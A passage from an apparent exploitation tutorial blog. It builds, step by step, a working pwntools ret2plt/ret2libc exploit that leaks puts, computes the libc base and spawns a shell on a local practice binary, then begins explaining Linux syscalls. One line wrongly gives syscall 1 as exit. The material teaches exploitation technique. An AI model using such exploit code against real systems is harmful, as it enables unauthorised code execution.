</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><p>We only need this <code>\xe0{\x88\xddHr</code> we can see that its in between <code>\n</code> which means newline so its in second line first index.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>print(leak)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>We can now see only our leaked address being print.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>: pid <span style="color:#ae81ff">8759</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;\xe0{h\x01\x88x&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><p>As we can see its still in little-endian format. We know <code>pack</code> function in <code>pwntools</code> converts hex or integer into little-endian format so we can use another function called <code>unpack</code> to reverse it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>leak_int <span style="color:#f92672">=</span> unpack(leak, <span style="color:#e6db74">&#39;all&#39;</span>)
</span></span><span style="display:flex;"><span>print(hex(leak_int))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>: pid <span style="color:#ae81ff">8900</span>
</span></span><span style="display:flex;"><span>0x732e57e87be0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><p>Okay, we now have the randomized address of <code>puts</code>, but to proceed, we need the <strong>base address of libc</strong>. This can be calculated by subtracting the known <strong>offset</strong> of <code>puts</code> (within libc) from the leaked address. This offset can be obtained from tools like <code>libc.rip</code> or by checking the symbols in a known <code>libc.so</code> file using <code>objdump</code> but first we need to find where is <code>libc.so</code> in our Machine. We can do by:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ldd ./ret2plt
</span></span><span style="display:flex;"><span>	linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007ffed34db000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x00007fd68f000000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	/lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007fd68f38e000<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We got <code>/lib/x86_64-linux-gnu/libc.so.6</code> now we can use <code>objdump</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump -T  /lib/x86_64-linux-gnu/libc.so.6 | grep -i puts
</span></span></code></pre></div><p><img src="/img/objdump.png" alt="objdump.png">
We got address <code>0000000000087be0</code>, put <code>0x</code> before to write in hex format like this: <code>0x0000000000087be0</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>leak_int <span style="color:#f92672">=</span> unpack(leak, <span style="color:#e6db74">&#39;all&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak_int <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x0000000000087be0</span>
</span></span><span style="display:flex;"><span>print(hex(libc_base))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py                                           
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>: pid <span style="color:#ae81ff">9598</span>
</span></span><span style="display:flex;"><span>0x7ae02f400000
</span></span></code></pre></div><p>Now we have our <strong>base address</strong>. We can just do <code>Ret2libc</code> attack. But here is one problem program exits after entering the payload, it just asks for input so we cant send payload next time for <code>Ret2libc</code> thats why we have to add <code>main</code> in end of payload. If we do this it will again return to <code>main</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret2plt</span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#recv leak</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>leak_int <span style="color:#f92672">=</span> unpack(leak, <span style="color:#e6db74">&#39;all&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak_int <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x0000000000087be0</span>
</span></span><span style="display:flex;"><span>print(hex(libc_base))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret2libc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Now after <code>pop_rdi</code> we need to call <code>/bin/sh</code> we need its address, which is addition of <code>libc_base</code> and <code>offset</code> of <code>/bin/sh</code> we can find offset of <code>/bin/sh</code> using this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -i /bin/sh
</span></span><span style="display:flex;"><span> 1cb42f /bin/sh
</span></span></code></pre></div><p>We get offset <code>1cb42f</code>. Do same for system function also. Since its function not string like <code>/bin/sh</code> we should use <code>objdump</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep <span style="color:#e6db74">&#39;system&#39;</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000058750</span>  w   DF .text	000000000000002d  GLIBC_2.2.5 system
</span></span></code></pre></div><p>We got offset <code>0000000000058750</code>.</p>
<p>Now here is final exploit, I modified few things because above exploit was had few issues but logic is still same. The issue in my previous code came from using <code>sendlineafter(payload)</code> instead of properly waiting for the input prompt with <code>sendlineafter(b'Enter Data -', payload)</code>. Because of this, I ended up sending the payload before the binary was ready to read input, which led to a segmentation fault. I also tried to unpack the leaked address directly using <code>unpack(leak, 'all')</code> without checking if the leak was clean or even valid. Sometimes the output had garbage or was empty, which caused wrong libc base calculations like getting <code>0x0</code> or other invalid addresses. Once I fixed the prompt handling and made sure the leak was processed properly, the exploit started working exactly as intended.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ret2plt</span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012c3</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts) <span style="color:#f92672">+</span> pack(puts) <span style="color:#f92672">+</span> pack(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You must give prompt if binary expects input (or it races)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter Data -&#39;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># recv leak</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvline()  <span style="color:#75715e"># skip first line</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e"># pad to 8 bytes</span>
</span></span><span style="display:flex;"><span>leak_int <span style="color:#f92672">=</span> unpack(leak, <span style="color:#e6db74">&#39;all&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak_int <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x0000000000087be0</span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ret2libc</span>
</span></span><span style="display:flex;"><span>bin_sh_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1cb42f</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000058750</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack(pop_rdi) <span style="color:#f92672">+</span> pack(bin_sh_addr) <span style="color:#f92672">+</span> pack(ret) <span style="color:#f92672">+</span> pack(system)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter Data -&#39;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/at0m/ret2plt&#39;</span>: pid <span style="color:#ae81ff">13452</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,105<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="0xa---ret2syscall">0xA - Ret2Syscall</h2>
<p>In operating systems, there are two primary modes of operation: <strong>user mode</strong> and <strong>kernel mode</strong>. These modes help maintain system security and stability by controlling how programs interact with hardware and critical system resources.</p>
<p>In <strong>kernel mode</strong>, the operating system has unrestricted access to all system resources, including hardware devices and memory. This mode is reserved for the most trusted functions, such as managing processes, handling interrupts, and executing system calls. Any code running in kernel mode can potentially crash the system if it misbehaves, which is why it is limited to the OS core components.</p>
<p>In contrast, <strong>user mode</strong> is a restricted environment where regular applications run. Programs in user mode cannot directly access hardware or critical memory areas. Instead, they must request services from the operating system through system calls. If a user-mode application crashes, it generally does not affect the rest of the system, making this mode safer for running third-party code.</p>
<p>Switching between these modes happens when a user-mode program makes a system call, temporarily shifting control to kernel mode to perform the requested task, and then returning to user mode. This separation ensures robust protection and efficient system management.</p>
<p><img src="/img/kmodenumode.png" alt="kmodenumode.png"></p>
<p>A <strong>system call</strong> is like a way for a program to ask the operating system to do something on its behalf. Since programs don‚Äôt have direct access to hardware or critical system resources, they use system calls to request things like reading or writing files, creating processes, or communicating over the network. It‚Äôs basically the bridge between user-level code and the kernel, letting programs perform tasks that require higher privileges.</p>
<p><img src="/img/introduction_to_system_call.webp" alt="introduction_to_system_call.webp"></p>
<p><strong>System Call on Linux x86-64 (AMD64)</strong></p>
<p>On <strong>Linux x86-64</strong>, the system call convention uses specific registers for each argument, with up to six allowed:</p>
<ul>
<li>
<p><strong><code>rax</code></strong>: Holds the <strong>system call number</strong> ‚Äî this tells the OS <em>which</em> service you want to use (for example, <code>1</code> for exit, <code>0</code> for read, <code>1</code> for write).</p>
</li>
<li>
<p><strong><code>rdi</code></strong>: Holds the <strong>first argument</strong> to the system call. For example, if you&rsquo;re writing to a file, this could be the file descriptor (like <code>1</code> for standard output).</p>
</li>
<li>
<p><strong><code>rsi</code></strong>: Holds the <strong>second argument</strong>. For example, this could be the pointer (memory address) to the buffer containing data you want to write or read.</p>
</li>
<li>
<p><strong><code>rdx</code></strong>: Holds the <strong>third argument</strong>, such as the number of bytes you want to write or read.</p>
</li>
<li>
<p><strong><code>r10</code></strong>: Holds the <strong>fourth argument</strong> if needed.</p>
</li>
<li>
<p><strong><code>r8</code></strong>: Holds the <strong>fifth argument</strong>.</p>
</li>
<li>
<p><strong><code>r9</code></strong>: Holds the <strong>sixth argument</strong>.</p>
</li>
</ul>
<p>Example: <code>write</code> syscall (write to stdout)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mov     rax, 1          ; syscall number for sys_write
</span></span><span style="display:flex;"><span>mov     rdi, 1          ; first argument: file descriptor 1 (stdout)
</span></span><span style="display:flex;"><span>mov     rsi, message    ; second argument: pointer to buffer to write
</span></span><span style="display:flex;"><span>mov     rdx, length     ; third argument: number of bytes to write
</span></span><span style="display:flex;"><span>syscall                 ; invoke the system call
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; after syscall, rax contains the number of bytes written or error code
</span></span></code></pre></div><p>There are different types of syscalls here are most common syscalls:</p>
<table>
  <thead>
      <tr>
          <th>Syscall</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>read</code></td>
          <td>Read from a file descriptor</td>
      </tr>
      <tr>
          <td><code>write</code></td>
          <td>Write to a file descriptor</td>
      </tr>
      <tr>
          <td><code>open</code> / <code>openat</code></td>
          <td>Open a file or device</td>
      </tr>
      <tr>
          <td><code>close</code></td>
          <td>Close a file descriptor</td>
      </tr>
      <tr>
          <td><code>stat</code> / <code>fstat</code> / <code>lstat</code></td>
          <td>Get file status info</td>
      </tr>
      <tr>
          <td><code>mmap</code> / <code>munmap</code></td>
          <td>Memory map files or devices</td>
      </tr>
      <tr>
          <td><code>brk</code></td>
          <td>Change data segment size (used by malloc)</td>
      </tr>
      <tr>
          <td><code>execve</code></td>
          <td>Execute a program</td>
      </tr>
      <tr>
          <td><code>fork</code> / <code>clone</code> / <code>vfork</code></td>
          <td>Create a new process</td>
      </tr>
      <tr>
          <td><code>exit</code> / <code>_exit</code></td>
          <td>Terminate a process</td>
      </tr>
      <tr>
          <td><code>wait4</code> / <code>waitpid</code></td>
          <td>Wait for a child process</td>
      </tr>
      <tr>
          <td><code>getpid</code></td>
          <td>Get process ID</td>
      </tr>
      <tr>
          <td><code>getppid</code></td>
          <td>Get parent process ID</td>
      </tr>
      <tr>
          <td><code>ioctl</code></td>
          <td>Device-specific I/O control operations</td>
      </tr>
      <tr>
          <td><code>lseek</code></td>
          <td>Move the read/write file offset</td>
      </tr>
      <tr>
          <td><code>access</code></td>
          <td>Check file access permissions</td>
      </tr>
      <tr>
          <td><code>recvfrom</code> / <code>sendto</code></td>
          <td>Receive/send network packets (sockets)</td>
      </tr>
      <tr>
          <td><code>socket</code></td>
          <td>Create a socket</td>
      </tr>
      <tr>
          <td><code>connect</code> / <code>bind</code> / <code>listen</code> / <code>accept</code></td>
          <td>Socket-related operations</td>
      </tr>
      <tr>
          <td><code>nanosleep</code></td>
          <td>Sleep for a short duration</td>
      </tr>
      <tr>
          <td><code>rt_sigaction</code></td>
          <td>Setup signal handlers</td>
      </tr>
      <tr>
